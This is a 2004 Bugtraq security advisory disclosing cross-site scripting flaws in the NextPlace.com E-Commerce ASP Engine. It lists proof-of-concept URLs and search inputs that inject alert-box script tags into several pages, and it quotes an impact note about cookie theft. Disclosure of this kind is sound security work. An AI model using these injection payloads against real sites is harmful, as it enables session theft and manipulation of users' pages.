
Date: Sat, 24 Jan 2004 23:56:24 +0200
From: "Rafel Ivgi, The-Insider" <theinsider@....net.il>
To: "bugtraq" <bugtraq@...urityfocus.com>
Cc: "securitytracker" <bugs@...uritytracker.com>
Subject: NextPlace.com E-Commerce ASP Engine


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Software:        NextPlace.com E-Commerce ASP Engine
Vendor:           http://www.nextplace.com/
Versions:         Single version was created
Bug:                 Cross Site Scripting
Risk:                Medium ( E-Commerce makes this irregular)
Exploitation:     Remote with browser
Date:               24 Jan 2004
Author:            Rafel Ivgi, The-Insider
E-Mail:             the_insider@...l.com
Web:                http://theinsider.deep-ice.com

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1) Introduction
2) Bug
3) The Code

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

===============
1) Introduction
===============

NextPlace.com is E-Commerce service provider.
E-Commerce ASP Engine this cannot have risks such as Cross Site Scripting.
It is Ridiculous that i discovered this because each one of this site is
under the
protection of many security companies and are marked as "safe".
Any attacker can fake messages, and betray the trust of all the people who
belive that links involved with this website are safe.

*** The Vulnerabillity described in this advisory effects all NextPlace's
Clients :http://www.nextplace.com/clients.asp   ***
This means <host> = anyone of NextPlace clients.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

======
2) Bug
======

The Vulnerabillity is Cross Site Scripting.
If an attacker will request the one following urls from the server:

Examples:
1.
http://<host>/productdetail.asp?level=aaaaaaaaaaaaaaaa&catid=52&productid=24
8

2.
http://<host>/productdetail.asp?level="><script>alert('XSS')</script>&catid=
52&productid=248

3. http://<host>/ListCategories.asp?level=58&catid=AAAAAAAAAAAAAAAAAA

4.
http://<host>/searchresults.asp?searchKey="><script>alert('XSS')</script> -
Go Back To see XSS

5. Goto "http://<host>/searchresults.asp" Search for
["><script>alert('XSS')</script>] - XSS
XSS appears and the server allows an attacker to inject & execute scripts.


In the words of securityfocus.com :
~~~~~~~~~~~~~~~~~~~~~~~~~~

If all of these circumstances are met, an attacker may be able to exploit
this issue
via a malicious link containing arbitrary HTML and script code as part of
the hostname.
When the malicious link is clicked by an unsuspecting user, the
attacker-supplied HTML
and script code will be executed by their web client. This will occur
because the server
will echo back the malicious hostname supplied in the client's request,
without sufficiently
escaping HTML and script code.

Attacks of this nature may make it possible for attackers to manipulate web
content or to
steal cookie-based authentication credentials. It may be possible to take
arbitrary actions as the victim user.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

===========
3) The Code
===========

1.
http://<host>/productdetail.asp?level=aaaaaaaaaaaaaaaa&catid=52&productid=24
8

2.
http://<host>/productdetail.asp?level="><script>alert('XSS')</script>&catid=
52&productid=248

3. http://<host>/ListCategories.asp?level=58&catid=AAAAAAAAAAAAAAAAAA

4.
http://<host>/searchresults.asp?searchKey="><script>alert('XSS')</script> -
Go Back To see XSS

5. Goto "searchresults.asp" Search for ["><script>alert('XSS')</script>] -
XSS
XSS appears and the server allows an attacker to inject & execute scripts.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

---
Rafel Ivgi, The-Insider
http://theinsider.deep-ice.com

"Things that are unlikeable, are NOT impossible."



